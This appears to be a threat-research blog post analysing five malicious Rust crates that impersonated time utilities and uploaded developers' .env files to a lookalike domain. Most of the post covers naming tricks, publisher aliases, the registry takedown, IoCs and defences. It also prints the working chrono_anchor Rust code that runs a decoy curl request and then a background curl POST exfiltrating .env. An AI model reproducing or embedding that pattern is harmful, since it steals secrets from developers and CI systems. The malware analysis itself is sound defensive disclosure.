---
title: "5 Malicious Rust Crates Posed as Time Utilities to Exfiltrate .env Files"
short_title: "5 Malicious Rust Crates Posed as Time Utilities"
date: 2026-03-10 12:00:00 +0000
categories: [Malware, Rust]
tags: [Typosquatting, Infostealer, Brandjacking, crates.io, RustSec, T1195.002, T1204, T1036, T1552.001, T1005, T1583.001, T1071.001, T1041]
canonical_url: https://socket.dev/blog/5-malicious-rust-crates-posed-as-time-utilities-to-exfiltrate-env-files
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/323c0768cae5d50cf080947d4858ecac21ba8cec-1024x1024.png?w=1000&q=95&fit=max&auto=format
  alt: "5 malicious Rust crates posed as time utilities to exfiltrate .env files"
description: "Published late February to early March 2026, these crates impersonate timeapi.io and POST .env secrets to a threat actor-controlled lookalike domain."
---

Socket's Threat Research Team uncovered a coordinated supply chain campaign in the Rust ecosystem involving five malicious crates: [`chrono_anchor`](https://socket.dev/cargo/package/chrono-anchor/overview/0.1.0), [`dnp3times`](https://socket.dev/cargo/package/dnp3times/overview/0.1.0), [`time_calibrator`](https://socket.dev/cargo/package/time-calibrator/overview/0.1.0), [`time_calibrators`](https://socket.dev/cargo/package/time-calibrators/overview/0.1.0), and [`time-sync`](https://socket.dev/cargo/package/time-sync/overview/0.1.0). RustSec and the GitHub Advisory Database document that [crates.io](http://crates.io) security yanked four of these packages shortly after publication.

The fifth package, `chrono_anchor`, shows the threat actor is adapting. It introduced minor obfuscation and operational changes that reduced obvious indicators and helped it remain listed on [crates.io](http://crates.io) until we identified and reported it. Although the crates pose as local time utilities, their core behavior is credential and secret theft. They attempt to collect sensitive data from developer environments, most notably `.env` files, and exfiltrate it to threat actor-controlled infrastructure.

Across all five crates, published between late February and early March 2026, the behavior is consistent and points to a single threat actor. Each crate follows the same exfiltration workflow and relies on the same infrastructure, including a lookalike domain, `timeapis[.]io`, that impersonates the legitimate and widely-trusted `timeapi.io` service. We assess with a high degree of confidence that these crates belong to the same campaign based on shared infrastructure, repeated code patterns, and identical exfiltration logic.

When we first flagged `chrono_anchor`, it was still live on [crates.io](http://crates.io). We petitioned for its removal and for suspension of the publisher account. The [crates.io](http://crates.io) security team rapidly investigated, yanked `chrono_anchor`, and suspended the associated publishing account. We also filed an abuse report requesting action on the publisher's GitHub account, which remained accessible at the time of writing.

We appreciate the crates.io security team's prompt response in this case and in prior cases where we reported malicious crates.

Adam Harvey from the crates.io team confirmed the removal and emphasized the ongoing collaboration between registry maintainers and security researchers.

> "The crates.io team is grateful that Socket continues to report malware as it is detected, and we look forward to continuing to work with Socket's Threat Research Team to keep our ecosystem safe."

![Socket AI Scanner flags chrono_anchor as malware](https://cdn.sanity.io/images/cgdhsj6q/production/0f24997a8b07c82fdf66c60e7f6a975f8e26ef01-1132x1300.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner flags `chrono_anchor` as malware after finding covert exfiltration embedded in `AnchorParams` validation code. The crate constructs two different hostnames from the same `REF_HOST` constant, uses a decoy HTTPS GET to `timeapi[.]io`, then downgrades to an HTTP POST to the lookalike `timeapis[.]io` and uploads a local file via `curl -F file=@{ENV_FILE_PATH}`. Because the trigger is unconditional inside `check_params()`, any code path that validates parameters, including tests, can cause silent outbound traffic and secret leakage._

## The Crate Cluster and the Response Window

RustSec, the security advisory database for the Rust ecosystem, documents a short-lived cluster of malicious crates that attempted to exfiltrate local `.env` files:

- [`time_calibrator`](https://rustsec.org/advisories/RUSTSEC-2026-0030.html) contained code that tried to upload `.env` files. RustSec reports no evidence of actual usage and states that [crates.io](http://crates.io) removed the crate and locked the publisher account.
- [`time_calibrators`](https://rustsec.org/advisories/RUSTSEC-2026-0031.html) attempted to exfiltrate `.env` files to infrastructure impersonating `timeapi.io`. RustSec reports removal about three hours after publication, with no evidence of actual downloads.
- [`dnp3times`](https://rustsec.org/advisories/RUSTSEC-2026-0032.html) used the same `.env` exfiltration workflow and typosquatted the legitimate [`dnp3time`](https://socket.dev/cargo/package/dnp3time) crate. RustSec reports removal within about six hours, with no evidence of actual downloads.
- [`time-sync`](https://rustsec.org/advisories/RUSTSEC-2026-0036.html) repeated the same pattern and was removed in roughly fifty minutes.

In addition to the RustSec-tracked crates above, `chrono_anchor` implements the same exfiltration logic and is owned on [crates.io](http://crates.io) by the user `dictorudin`.

![crates.io publisher profile for dictorudin](https://cdn.sanity.io/images/cgdhsj6q/production/a5cbbe38e64f037a715c7acb62300893a56e4035-939x448.png?w=1600&q=95&fit=max&auto=format)
_The [crates.io](http://crates.io) publisher profile for `dictorudin` shows a single published crate, `chrono_anchor`, with 66 total downloads at the time of capture. The one crate footprint, small uptake, and recent update activity are consistent with a short-lived supply chain publishing identity rather than an established maintainer account._

## Threat Actor Strategy and Publisher Pivots

The threat actor framed each crate as a practical time utility tailored to real developer needs. Promises like "local time calibration without NTP" read as credible in restricted networks and CI environments where outbound time sync is unavailable or undesirable, and where teams still need a stable reference point for telemetry and scheduling.

![Socket AI Scanner English-language view of chrono_anchor](https://cdn.sanity.io/images/cgdhsj6q/production/20b3041653e4ebfd3d94224308c78a25abcbb392-2048x1149.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's English-language view of `chrono_anchor` shows how the threat actor sells the crate as a legitimate "no NTP, local time alignment" utility for constrained networks and CI workflows, a plausible use case that lowers reviewer skepticism. That positioning helps the crate look like a benign telemetry and scheduling aid even though the underlying code triggers covert outbound requests to exfiltrate `.env` secrets._

The threat actor also relied on name selection that blends into common Rust naming conventions. `dnp3times` typosquats the legitimate [`dnp3time`](https://socket.dev/cargo/package/dnp3time) crate, increasing the chance of accidental installs. `chrono_anchor` fits a brandjacking pattern instead: it borrows the recognition of the widely-used `chrono` ecosystem and appends a plausible extension term `anchor`, to look like a legitimate companion crate. The remaining packages, `time_calibrator`, `time_calibrators`, and `time-sync`, imitate harmless-sounding calibration utilities, which makes their network activity easier to rationalize during casual review.

The `chrono_anchor` manifest hardcodes the author email `gehakax777@kaoing[.]com`, which maps to the [crates.io](http://crates.io) alias `gehakax777`. The manifest also sets `homepage` and `repository` to the GitHub account `https://github[.]com/suntea279491`, which returned a 404 page at the time of writing. At the registry level, `chrono_anchor` was published under the [crates.io](http://crates.io) account `dictorudin`, which links to the corresponding GitHub profile `https://github[.]com/dictorudin`, which showed no public repositories or other public activity at the time of writing. We also observed a second author email, `jack@kaoing[.]com`, in another crate from the same cluster, suggesting the threat actor rotated identities while continuing to rely on the same disposable email domain.

## What the Malicious Code Does Once Executed

In `chrono_anchor`, the exfiltration logic lives in `guard.rs` and is invoked from routine-looking parameter validation and "optional sync" helpers, code paths a developer could call without expecting any network activity.

First, the crate generates benign-looking cover traffic by building an HTTPS URL under `timeapi.io` and running `curl` in silent mode with a three-second timeout, which makes the request resemble a legitimate time check. Next, it derives the exfiltration endpoint by appending a single character to the same hostname string, turning `timeapi` into `timeapis`, and downgrades the request to plain HTTP. Finally, it launches a background thread that waits one second and then uploads the file referenced by `ENV_FILE_PATH` using a multipart form post, `curl -F file=@<path>`. In this crate, `ENV_FILE_PATH` resolves to `.env`, a common location for API keys and other environment secrets.

Below is the `chrono_anchor` code snippet with our inline comments.

```rust
const REF_HOST: &str = "timeapi";
const REF_PATH: &str = "/api/Time/current/zone?timeZone=UTC";

fn fetch_ref_background() {
    std::thread::spawn(|| {

        // Cover traffic to appear benign.
        let url = format!("https://{}.io{}", REF_HOST, REF_PATH);

        // Silent GET with a 3s timeout via external curl.
        let _ = std::process::Command::new("curl")
            .args(["-s", "-m", "3", url.as_str()])
            .output();
    });
}

pub fn run_optional_syncs() {

    // Triggers cover traffic and exfiltration.
    fetch_ref_background();
    submit_snapshot();
}

fn submit_snapshot() {
    std::thread::spawn(|| {

    // Delay to reduce obvious correlation.
        std::thread::sleep(std::time::Duration::from_secs(1));

    // Full exfil URL: http://timeapis[.]io/api/Time/current/zone?timeZone=UTC
    // Derived by appending "s" to REF_HOST and downgrading to HTTP.
        let ep = format!("http://{}s.io{}", REF_HOST, REF_PATH);

        // Uploads the local secrets file path (typically ".env").
        let form_arg = format!("file=@{}", crate::paths::ENV_FILE_PATH);

        // Multipart POST upload via curl, output discarded.
        let _ = std::process::Command::new("curl")
            .args(["-s", "-X", "POST", ep.as_str(), "-F", form_arg.as_str()])
            .output();
    });
}
```

This code does not establish persistence. It does not install a service, create a scheduled task, or register an autorun entry. Instead, it relies on repeated execution: whenever a developer or CI job hits the affected code path, the crate attempts to exfiltrate `.env` secrets again.

## Why `.env` Is a High-Value Target

Many teams rely on `.env` files because they are simple, portable, and fit naturally into `dotenv`-style workflows across local development and CI. Developers use them to keep API keys, tokens, and other secrets out of source control while still making configuration easy to load at runtime. The popularity of crates like [`env_file`](https://socket.dev/cargo/package/env-file), which explicitly promotes file-based secret storage as a way to avoid committing credentials to version control, reflects how common this practice remains.

That convention makes `.env` a high-value target in supply chain attacks. One successful upload can hand a threat actor the credentials needed to access cloud services, internal databases, GitHub and registry tokens, and sometimes signing material used in release automation. If a repository includes a `.env` file with production or staging secrets, a single dependency execution can turn a routine build into a credential leak.

## Outlook and Recommendations

This campaign shows that low-complexity supply chain malware can still deliver high-impact when it runs inside developer workspaces and CI jobs. We assess that in the future there will be more of the same core playbook, benign utility framing, lookalike infrastructure, `.env` targeting, and obfuscation to survive longer in the registry.

Prioritize controls that stop malicious dependencies before they execute. Run [**cargo-audit**](https://crates.io/crates/cargo-audit) and [**cargo-deny**](https://crates.io/crates/cargo-deny) in CI for RustSec and policy enforcement, then layer [**Socket GitHub App**](https://socket.dev/features/github), [**Socket CLI**](https://socket.dev/features/cli), and [**Socket Firewall**](https://socket.dev/blog/introducing-socket-firewall) to block malicious behavior and transitive pulls before execution. For developer workflow coverage, add the [**Socket browser extension**](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) during package review, and use [**Socket MCP**](https://socket.dev/blog/socket-mcp) to flag suspicious or hallucinated dependencies before they are added to a project.

If the malicious code path ran while `.env` existed in the working directory, assume possible exfiltration. Rotate tokens and keys, audit CI jobs that run with publish or deploy credentials, and restrict outbound network access in build and test phases where feasible. Pin dependencies, review new crates like code changes, and alert on packages that claim "no network required" but spawn external tools such as `curl` or perform background HTTP requests.

## Indicators of Compromise (IoCs)

### Malicious Crates

1. [`chrono_anchor`](https://socket.dev/cargo/package/chrono-anchor/overview/0.1.0)
2. [`dnp3times`](https://socket.dev/cargo/package/dnp3times/overview/0.1.0)
3. [`time_calibrator`](https://socket.dev/cargo/package/time-calibrator/overview/0.1.0)
4. [`time_calibrators`](https://socket.dev/cargo/package/time-calibrators/overview/0.1.0)
5. [`time-sync`](https://socket.dev/cargo/package/time-sync/overview/0.1.0)

### Exfiltration Endpoints

- `http://timeapis[.]io/api/Time/current/zone?timeZone=UTC` (exfiltration URL, HTTP POST upload target)
- `timeapis[.]io` (lookalike exfiltration domain)

### Threat Actor's Aliases

- `gehakax777`
- `dictorudin`
- `suntea279491`

### Threat Actor's Email Addresses

- `gehakax777@kaoing[.]com`
- `jack@kaoing[.]com`

### Threat Actor GitHub Accounts

- `https://github[.]com/suntea279491`
- `https://github[.]com/dictorudin`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1204 — User Execution
- T1036 — Masquerading
- T1552.001 — Unsecured Credentials: Credentials In Files
- T1005 — Data from Local System
- T1583.001 — Acquire Infrastructure: Domains
- T1071.001 — Application Layer Protocol: Web Protocols
- T1041 — Exfiltration Over C2 Channel
